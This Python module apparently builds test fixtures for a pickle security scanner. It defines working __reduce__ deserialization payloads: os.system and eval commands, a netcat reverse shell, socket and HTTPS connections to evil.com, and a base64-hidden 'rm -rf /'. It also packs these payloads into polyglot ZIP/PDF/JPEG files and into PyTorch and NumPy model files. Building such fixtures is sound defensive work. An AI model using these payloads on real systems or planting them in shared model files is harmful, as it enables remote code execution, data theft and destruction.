"""
Malicious pickle test fixtures for security scanner testing.
Inspired by fickling and picklescan test approaches.
"""
import pickle
import os
import subprocess
import base64
from typing import Any, Dict, List


class PickleExploits:
    """Collection of pickle exploit patterns for testing."""

    class OSSystemExploit:
        """Execute system commands via os.system."""
        def __reduce__(self):
            return (os.system, ('echo "EXPLOITED" > /tmp/pwned.txt',))

    class EvalCodeExecution:
        """Execute arbitrary Python code via eval."""
        def __reduce__(self):
            return (eval, ("__import__('os').system('whoami')",))

    class SubprocessExploit:
        """Launch subprocess with shell command."""
        def __reduce__(self):
            return (subprocess.Popen, (['nc', '-e', '/bin/sh', '127.0.0.1', '4444'],))

    class ExecExploit:
        """Execute Python code via exec."""
        def __reduce__(self):
            code = "import socket; s=socket.socket(); s.connect(('evil.com', 4444))"
            return (exec, (code,))

    class ImportExploit:
        """Import dangerous modules."""
        def __reduce__(self):
            return (__import__, ('os',))

    class GetAttrChain:
        """Chain getattr calls to access dangerous functions."""
        def __reduce__(self):
            return (getattr, (__import__('os'), 'system'))

    class Base64Decoder:
        """Hide payload in base64."""
        def __reduce__(self):
            payload = base64.b64encode(b"os.system('rm -rf /')").decode()
            return (eval, (f"__import__('base64').b64decode('{payload}')",))

    class BuiltinsAccess:
        """Access builtins to get dangerous functions."""
        def __reduce__(self):
            return (getattr, (__builtins__, '__import__'))

    class FileWrite:
        """Write malicious files to disk."""
        def __reduce__(self):
            return (open, ('/tmp/backdoor.sh', 'w'))

    class SocketBackdoor:
        """Create network backdoor."""
        def __reduce__(self):
            import socket
            return (socket.socket, (socket.AF_INET, socket.SOCK_STREAM))
    
    class BdbDebuggerExploit:
        """Access debugger for code inspection/manipulation."""
        def __reduce__(self):
            import bdb
            return (bdb.Bdb, ())
    
    class HttpClientExploit:
        """Create HTTP connection for data exfiltration."""
        def __reduce__(self):
            import http.client
            return (http.client.HTTPSConnection, ('evil.com',))
    
    class AioHttpExploit:
        """Async HTTP client for covert channels."""
        def __reduce__(self):
            # This will fail if aiohttp not installed, but that's OK for testing
            return (__import__, ('aiohttp',))
    
    class VenvExploit:
        """Create virtual environment for persistent backdoor."""
        def __reduce__(self):
            import venv
            return (venv.create, ('/tmp/evil_venv',))
    
    class RequestsExploit:
        """Make HTTP requests to exfiltrate data."""
        def __reduce__(self):
            # Attempt to use requests library
            return (getattr, (__import__('requests'), 'get'))
    
    class PipMainExploit:
        """Install malicious packages via pip."""
        def __reduce__(self):
            # Try to access pip.main for package installation
            pip = __import__('pip')
            return (getattr, (pip, 'main'))


def generate_malicious_pickles() -> Dict[str, bytes]:
    """
    Generate various malicious pickle payloads.
    
    Returns:
        Dictionary mapping exploit name to pickle bytes.
    """
    exploits = {}
    
    # Basic exploits
    for name, exploit_class in [
        ('os_system', PickleExploits.OSSystemExploit),
        ('eval_exec', PickleExploits.EvalCodeExecution),
        ('subprocess', PickleExploits.SubprocessExploit),
        ('exec_code', PickleExploits.ExecExploit),
        ('import_os', PickleExploits.ImportExploit),
        ('getattr_chain', PickleExploits.GetAttrChain),
        ('base64_hide', PickleExploits.Base64Decoder),
        ('builtins', PickleExploits.BuiltinsAccess),
        ('file_write', PickleExploits.FileWrite),
        ('socket_backdoor', PickleExploits.SocketBackdoor),
        ('bdb_debugger', PickleExploits.BdbDebuggerExploit),
        ('http_client', PickleExploits.HttpClientExploit),
        ('aiohttp', PickleExploits.AioHttpExploit),
        ('venv_create', PickleExploits.VenvExploit),
        ('requests_get', PickleExploits.RequestsExploit),
        ('pip_main', PickleExploits.PipMainExploit),
    ]:
        try:
            obj = exploit_class()
            # Test with different pickle protocols
            for protocol in [0, 2, 3, 4, 5]:
                key = f"{name}_protocol_{protocol}"
                exploits[key] = pickle.dumps(obj, protocol=protocol)
        except Exception:
            # Some protocols might not support certain features
            pass
    
    return exploits


def generate_benign_pickles() -> Dict[str, bytes]:
    """
    Generate benign pickle files for comparison.
    
    Returns:
        Dictionary mapping description to pickle bytes.
    """
    benign = {}
    
    # Simple data types
    benign['string'] = pickle.dumps("Hello, World!")
    benign['integer'] = pickle.dumps(42)
    benign['float'] = pickle.dumps(3.14159)
    benign['list'] = pickle.dumps([1, 2, 3, 4, 5])
    benign['dict'] = pickle.dumps({'key': 'value', 'number': 123})
    benign['tuple'] = pickle.dumps((1, 'two', 3.0))
    benign['set'] = pickle.dumps({1, 2, 3})
    
    # Complex nested structures
    benign['nested_dict'] = pickle.dumps({
        'metadata': {
            'version': '1.0.0',
            'created': '2024-01-01'
        },
        'data': [1, 2, 3],
        'config': {
            'enabled': True,
            'threshold': 0.95
        }
    })
    
    # Model-like structure (safe)
    benign['model_config'] = pickle.dumps({
        'architecture': 'resnet50',
        'weights': [[0.1, 0.2], [0.3, 0.4]],
        'layers': [
            {'type': 'conv2d', 'filters': 64},
            {'type': 'maxpool', 'size': 2},
            {'type': 'dense', 'units': 1000}
        ],
        'training': {
            'epochs': 100,
            'batch_size': 32,
            'learning_rate': 0.001
        }
    })
    
    return benign


def generate_polyglot_pickles() -> Dict[str, bytes]:
    """
    Generate polyglot files that combine pickle with other formats.
    
    Returns:
        Dictionary mapping description to file bytes.
    """
    polyglots = {}
    
    # ZIP + Pickle polyglot
    import zipfile
    import io
    
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w') as zf:
        zf.writestr('data.txt', 'innocent content')
    zip_bytes = zip_buffer.getvalue()
    
    # Append pickle data to ZIP
    exploit = PickleExploits.OSSystemExploit()
    pickle_bytes = pickle.dumps(exploit)
    polyglots['zip_pickle'] = zip_bytes + b'\x00PICKLE\x00' + pickle_bytes
    
    # PDF + Pickle polyglot
    pdf_header = b'%PDF-1.4\n%\xE2\xE3\xCF\xD3\n'
    pdf_body = b'1 0 obj\n<< /Type /Catalog >>\nendobj\n'
    pdf_xref = b'xref\n0 1\n0000000000 65535 f\ntrailer\n<< /Size 1 >>\nstartxref\n0\n'
    pdf_end = b'%%EOF\n'
    pdf_bytes = pdf_header + pdf_body + pdf_xref + pdf_end
    polyglots['pdf_pickle'] = pdf_bytes + b'\x00PICKLE\x00' + pickle_bytes
    
    # JPEG + Pickle (using comment section)
    jpeg_header = b'\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00'
    jpeg_comment = b'\xFF\xFE' + struct.pack('>H', len(pickle_bytes) + 2) + pickle_bytes
    jpeg_end = b'\xFF\xD9'
    polyglots['jpeg_pickle'] = jpeg_header + jpeg_comment + jpeg_end
    
    return polyglots


def generate_pytorch_exploits() -> Dict[str, bytes]:
    """
    Generate PyTorch-specific pickle exploits.
    
    Returns:
        Dictionary mapping description to file bytes.
    """
    pytorch_exploits = {}
    
    # PyTorch .pth file with malicious pickle
    import zipfile
    import io
    
    # Create ZIP structure like PyTorch
    pth_buffer = io.BytesIO()
    with zipfile.ZipFile(pth_buffer, 'w') as zf:
        # Add version file
        zf.writestr('version', b'3\n')
        
        # Add malicious data.pkl
        exploit = PickleExploits.OSSystemExploit()
        malicious_state = {
            'model_state_dict': exploit,
            'optimizer_state_dict': {},
            'epoch': 100
        }
        zf.writestr('data.pkl', pickle.dumps(malicious_state))
        
        # Add legitimate-looking structure
        zf.writestr('data/.data/', b'')
    
    pytorch_exploits['malicious_pth'] = pth_buffer.getvalue()
    
    # TorchScript with embedded exploit
    ts_buffer = io.BytesIO()
    with zipfile.ZipFile(ts_buffer, 'w') as zf:
        zf.writestr('version', b'3\n')
        zf.writestr('constants.pkl', pickle.dumps([PickleExploits.ExecExploit()]))
        zf.writestr('model/code/__torch__.py', b'def forward(x): return x')
    
    pytorch_exploits['malicious_torchscript'] = ts_buffer.getvalue()
    
    # Checkpoint with code execution
    checkpoint = {
        'model': PickleExploits.EvalCodeExecution(),
        'config': {'layers': 10},
        'training_step': 1000
    }
    pytorch_exploits['malicious_checkpoint'] = pickle.dumps(checkpoint)
    
    return pytorch_exploits


def generate_numpy_exploits() -> Dict[str, bytes]:
    """
    Generate NumPy file exploits using object arrays.
    Following picklescan's test approach for proper numpy files.
    
    Returns:
        Dictionary mapping description to file bytes.
    """
    numpy_exploits = {}
    
    try:
        import numpy as np
        import io
        
        # Create object array with malicious payload (similar to picklescan tests)
        class NumpyExploit:
            def __reduce__(self):
                import os
                return (os.system, ('echo pwned > /tmp/numpy_exploit.txt',))
        
        # Save malicious object array to bytes
        npy_buffer = io.BytesIO()
        np.save(npy_buffer, np.array([NumpyExploit()], dtype=object), allow_pickle=True)
        numpy_exploits['object_array_exploit'] = npy_buffer.getvalue()
        
        # Create NPZ with mixed content
        import zipfile
        npz_buffer = io.BytesIO()
        with zipfile.ZipFile(npz_buffer, 'w') as npz:
            # Add safe integer array
            safe_buffer = io.BytesIO()
            np.save(safe_buffer, np.array([1, 2, 3], dtype=int))
            npz.writestr('safe.npy', safe_buffer.getvalue())
            
            # Add malicious object array
            mal_buffer = io.BytesIO()
            np.save(mal_buffer, np.array([NumpyExploit()], dtype=object), allow_pickle=True)
            npz.writestr('malicious.npy', mal_buffer.getvalue())
        
        numpy_exploits['npz_with_pickle'] = npz_buffer.getvalue()
        
    except ImportError:
        # If numpy not available, create empty exploits
        pass
    
    return numpy_exploits


# Import struct for polyglot generation
import struct


if __name__ == "__main__":
    # Generate test fixtures
    print("Generating malicious pickle test fixtures...")
    
    malicious = generate_malicious_pickles()
    print(f"Generated {len(malicious)} malicious pickle variants")
    
    benign = generate_benign_pickles()
    print(f"Generated {len(benign)} benign pickle samples")
    
    polyglots = generate_polyglot_pickles()
    print(f"Generated {len(polyglots)} polyglot files")
    
    pytorch = generate_pytorch_exploits()
    print(f"Generated {len(pytorch)} PyTorch exploits")
    
    numpy = generate_numpy_exploits()
    print(f"Generated {len(numpy)} NumPy exploits")